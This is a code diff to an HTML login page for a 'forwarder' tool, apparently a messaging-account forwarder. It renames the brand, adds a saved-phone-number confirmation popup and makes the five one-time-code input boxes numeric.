@@ -12,6 +12,25 @@
 </head>
 <body>
     <div class="container">
+        <div id="phone-confirm-popup" class="popup-container">
+            <div class="popup-content">
+                <div class="popup-header">
+                    <h2>Use Saved Number?</h2>
+                </div>
+                <div class="popup-body">
+                    <div class="phone-confirm-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                        </svg>
+                    </div>
+                    <p class="phone-confirm-text">Use <strong id="saved-phone-display"></strong>?</p>
+                    <div class="phone-confirm-buttons">
+                        <button id="use-saved-phone" class="btn-primary">Yes, Use This</button>
+                        <button id="use-different-phone" class="btn-secondary">Use Different</button>
+                    </div>
+                </div>
+            </div>
+        </div>
         <div id="phone-container" class="form-container active">
             <div class="logo">
                 <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -20,7 +39,7 @@
                     <line x1="15" y1="12" x2="3" y2="12"></line>
                 </svg>
             </div>
-            <h1>Login to FLUXX FORWARDER</h1>
+            <h1>Login to SOUL FORWARDER</h1>
             <h1>Hey {% if first_name %}{{ first_name }}{% else %}there{% endif %} 👋</h1>
             <p class="subtitle">Please enter your phone number to continue</p>
             <form id="phone-form">
@@ -83,11 +102,11 @@
             <form id="otp-form">
                 <input type="hidden" id="stored-phone" name="phone">
                 <div class="otp-inputs">
-                    <input type="text" maxlength="1" class="otp-input" data-index="1">
-                    <input type="text" maxlength="1" class="otp-input" data-index="2">
-                    <input type="text" maxlength="1" class="otp-input" data-index="3">
-                    <input type="text" maxlength="1" class="otp-input" data-index="4">
-                    <input type="text" maxlength="1" class="otp-input" data-index="5">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" data-index="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" data-index="2">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" data-index="3">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" data-index="4">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" data-index="5">
                 </div>
                 <input type="hidden" id="full-otp" name="otp">
                 <button type="submit" class="btn-primary">Verify</button>
